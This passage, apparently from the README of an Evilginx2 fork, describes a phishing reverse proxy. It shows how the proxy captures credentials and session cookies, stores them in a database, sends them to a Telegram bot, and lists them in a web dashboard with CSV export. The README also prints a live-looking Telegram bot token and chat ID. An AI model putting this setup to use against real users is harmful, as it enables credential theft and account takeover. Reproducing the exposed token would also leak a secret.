│  │  ├── Extracts username/password from form body or JSON payload                                │ │
│  │  ├── Stores in Session object (core/session.go)                                               │ │
│  │  └── Forwards request to REAL website (login succeeds)                                        │ │
│  └───────────────────────────────────────────────────────────────────────────────────────────────┘ │
│                                            │                                                         │
│  PHASE 3: RESPONSE INTERCEPTION                                                                     │
│  ┌───────────────────────────────────────────────────────────────────────────────────────────────┐ │
│  │  http_proxy.go intercepts the response from real website                                      │ │
│  │  ├── Captures Set-Cookie headers → CookieTokens                                               │ │
│  │  ├── Captures response body tokens → BodyTokens                                               │ │
│  │  ├── Captures HTTP header tokens → HttpTokens                                                 │ │
│  │  └── Checks if all required auth tokens are captured                                          │ │
│  └───────────────────────────────────────────────────────────────────────────────────────────────┘ │
│                                            │                                                         │
│  PHASE 4: SESSION PERSISTENCE                                                                       │
│  ┌───────────────────────────────────────────────────────────────────────────────────────────────┐ │
│  │  If session is complete:                                                                      │ │
│  │  ├── Save to BuntDB via database.db_session.go (CreateSession)                                │ │
│  │  └── Notify the Telegram queue                                                                │ │
│  └───────────────────────────────────────────────────────────────────────────────────────────────┘ │
│                                            │                                                         │
│  PHASE 5: TELEGRAM NOTIFICATION                                                                    │
│  ┌───────────────────────────────────────────────────────────────────────────────────────────────┐ │
│  │  telegram_queue.go receives job → processes async                                            │ │
│  │  ├── notify.go → createTxtFile(): formats tokens into JSON → writes .txt to /tmp             │ │
│  │  ├── notify.go → formatSessionMessage(): builds MarkdownV2 message                           │ │
│  │  ├── tele.go → sendTelegramNotification(): sends document with caption                       │ │
│  │  └── notify.go → stores message_id in sessionMessageMap                                     │ │
│  └───────────────────────────────────────────────────────────────────────────────────────────────┘ │
│                                            │                                                         │
│  PHASE 6: SUBSEQUENT TOKENS (if any)                                                               │
│  ┌───────────────────────────────────────────────────────────────────────────────────────────────┐ │
│  │  If more tokens arrive for same session:                                                      │ │
│  │  ├── notify.go checks processedSessions map → already processed?                              │ │
│  │  ├── YES → look up message_id from sessionMessageMap                                          │ │
│  │  ├── tele.go → editMessageFile(): edits the same Telegram message                             │ │
│  │  └── No new message in chat — existing message is updated                                     │ │
│  └───────────────────────────────────────────────────────────────────────────────────────────────┘ │
│                                            │                                                         │
│  PHASE 7: DASHBOARD ACCESS                                                                          │
│  ┌───────────────────────────────────────────────────────────────────────────────────────────────┐ │
│  │  User opens browser → http://SERVER:5000                                                      │ │
│  │  ├── dashboard.go → handleDashboard(): serves HTML template with inline JS                    │ │
│  │  ├── dashboard.go → handleAPISessions(): returns JSON from BuntDB                             │ │
│  │  ├── Frontend JS renders table, search, filter, pagination                                    │ │
│  │  └── Export buttons download CSV/JSON via /api/sessions/export                                │ │
│  └───────────────────────────────────────────────────────────────────────────────────────────────┘ │
│                                                                                                     │
└─────────────────────────────────────────────────────────────────────────────────────────────────────┘


📂 Repository File Structure

evilginx2/
│
├── main.go                          # 🚀 Entry point — flags, init, start all components
│
├── core/                            # 🧠 Core engine
│   ├── http_proxy.go                #    MITM reverse proxy (modified for TG integration)
│   ├── session.go                   #    In-memory session management
│   ├── config.go                    #    Config (includes Chatid/Teletoken setters)
│   ├── notify.go                    #    📱 Telegram notification logic + file creation
│   ├── telegram_queue.go            #    ⏳ Async notification queue (buffered channel)
│   ├── tele.go                      #    📡 Low-level Telegram API calls
│   ├── telegram_escape.go           #    🔤 MarkdownV2 escaping for Telegram
│   ├── tsession.go                  #    📋 Telegram session struct + DB reader
│   ├── dashboard.go                 #    📊 Web dashboard (HTML + REST API)
│   ├── auto_export.go               #    📁 Auto-export sessions to JSON/CSV
│   ├── nameserver.go                #    🌐 DNS server
│   ├── certdb.go                    #    🔐 SSL certificate management
│   ├── blacklist.go                 #    🚫 IP blacklist
│   ├── whitelist.go                 #    ✅ IP whitelist
│   ├── phishlet.go                  #    🎣 Phishlet engine
│   ├── terminal.go                  #    💻 CLI interface
│   ├── gophish.go                   #    🔗 Gophish integration
│   ├── banner.go                    #    🖼️ ASCII art banner
│   ├── help.go                      #    ❓ Help commands
│   ├── scripts.go                   #    📜 JS injection scripts
│   ├── shared.go                    #    🔧 Shared utilities
│   ├── table.go                     #    📋 Table formatting
│   └── utils.go                     #    🔧 Utility functions
│
├── database/                        # 💾 Persistence layer
│   ├── database.go                  #    BuntDB wrapper — init, helpers, CRUD dispatch
│   └── db_session.go                #    Session struct + full CRUD operations
│
├── phishlets/                       # 🎣 YAML phishing templates (office365, google, etc.)
├── redirectors/                     # 🔀 HTML redirector pages
│
├── Dockerfile                       # 🐳 Multi-stage Alpine build (~18MB)
├── .dockerignore                    #    Docker build exclusions
├── docker-compose.yml               #    Docker Compose configuration
│
├── Makefile                         # 🔨 Build helpers
├── go.mod / go.sum                  # 📦 Go module dependencies
│
├── DEPLOYMENT.md                    # 📘 Full deployment guide
├── CHANGELOG                        # 📋 Version history
├── LICENSE                          # ⚖️ BSD 3-Clause
└── README.md                        # 📖 This file


🖼️ Screenshots
Terminal Console

___________      __ __           __
                                             \_   _____/__  _|__|  |    ____ |__| ____ ___  ___
                                              |    __)_\  \/ /  |  |   / __ \|  |/    \\  \/  /
                                              |        \\   /|  |  |__/ /_/  >  |   |  \>    <
                                             /_______  / \_/ |__|____/\___  /|__|___|  /__/\_ \
                                                     \/              /_____/         \/      \/

                                                        - --  Community Edition  -- -

                                               by Kuba Gretzky (@mrgretzky)     version 3.3.0

[23:45:12] [inf] Telegram Chat ID set to: 7545456339
[23:45:12] [inf] Telegram Bot Token set to: 8863425004:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo
[23:45:12] [inf] dashboard: web interface starting on http://0.0.0.0:5000
[23:45:12] [inf] telegram: notification queue started
[23:45:12] [inf] certificate cache: 0 certificates loaded
evilginx>

Telegram Notification

┌────────────────────────────────────────────────────────────────────┐
│                                                                    │
│  ✨ Session Information ✨                                         │
│                                                                    │
│  👤 Username: admin@megacorp.com                                   │
│  🔑 Password: April2024Budget!                                    │
│  🌐 Landing URL: https://login.yourdomain.com/abc123               │
│  🖥️ User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)...      │
│  🌍 Remote Address: 203.0.113.42                                   │
│  🕒 Created: 1780014345                                            │
│                                                                    │
│  📦 Tokens are attached as a separate file.                       │
│                                                                    │
│  🔄 Message will be updated if more tokens arrive                 │
│                                                                    │
└────────────────────────────────────────────────────────────────────┘


Web Dashboard

┌─────────────────────────────────────────────────────────────────────────────┐
│                                                                             │
│  🦊 Evilginx2 — Telegram Edition                        [🌙 Dark Mode]    │
│  by @officialmonsterz                                                       │
│                                                                             │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐                                  │
│  │   42     │  │    3     │  │   20     │                                  │
│  │  Total   │  │  Unique  │  │ Display  │                                  │
│  └──────────┘  └──────────┘  └──────────┘                                  │
│                                                                             │
│  [🔍 Search...              ]  [📁 All Phishlets ▼]                        │
│                                                                             │
│  [📥 Export CSV]  [📥 Export JSON]  [🔄 Refresh]                          │
│                                                                             │
│  ┌────┬──────────┬────────────────────┬────────────┬──────────────────┐   │
│  │ #  │ Phishlet │ Username           │ Password   │ Remote Address   │   │
│  ├────┼──────────┼────────────────────┼────────────┼──────────────────┤   │
│  │ 1  │office365 │ ceo@megacorp.com   │Winter2024! │ 203.0.113.42     │   │
│  │ 2  │ google   │ admin@startup.io   │P@ssw0rd    │ 198.51.100.7     │   │
│  │ 3  │ linkedin │ hr@company.org     │Recruit123  │ 192.0.2.88       │   │
│  │ 4  │office365 │ finance@corp.net   │Q1Report!   │ 203.0.113.15     │   │
│  │ 5  │facebook  │ marketing@brand.com│AdBuget2024 │ 198.51.100.33    │   │
│  └────┴──────────┴────────────────────┴────────────┴──────────────────┘   │
│                                                                             │
│  ◀ Previous    Page 1 of 5    Next ▶               🟢 Auto-refresh: ON     │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘

⚖️ Disclaimer

    I am fully aware that Evilginx can be used for nefarious purposes. This work is merely a demonstration of what adept attackers can do. It is the defender's responsibility to take such attacks into consideration and find ways to protect their users against this type of phishing attacks.

    Evilginx should be used only in legitimate penetration testing assignments with written permission from the parties being tested.

    Unauthorized use of this tool is illegal and unethical. The author and contributors assume no liability for misuse.


👏 Credits & Support
Contributors

Contribution	Author	Contact
Telegram Integration — Async queue, file attachments, auto-updating messages	@officialmonsterz	GitHub / Telegram / shapads@tutamail.com
Web Dashboard — HTML UI, REST API, CSV/JSON export, search, dark mode	@officialmonsterz	GitHub / Telegram
Database Layer — BuntDB integration, session CRUD	@officialmonsterz	GitHub / Telegram
Docker Build — Multi-stage, Alpine, ~18MB	@officialmonsterz	GitHub / Telegram
Auto-Export System — Auto-save sessions to JSON/CSV	@officialmonsterz	GitHub / Telegram
Original Evilginx2/3 (Core Framework)	Kuba Gretzky (@mrgretzky)	kgretzky/evilginx2

Big thanks to Kuba Gretzky for creating such a phenomenal tool and making it open source. This fork builds upon his incredible work.

Get Help

    Telegram Support: t.me/officialmonsterz
    Email: shapads@tutamail.com
    GitHub Issues: github.com/officialmonsterz/evilginx2/issues
    Repository: github.com/officialmonsterz/evilginx2


Evilginx Training Course

    🔥 Already mastering Evilginx? Level up with the complete Evilginx Training Course.

    Covers phishlet creation, advanced deployment techniques, and real-world red team methodologies.



Evilginx2 Logo

Created with ❤️ by @officialmonsterz

Special thanks to the entire Evilginx community for their contributions and support.

```







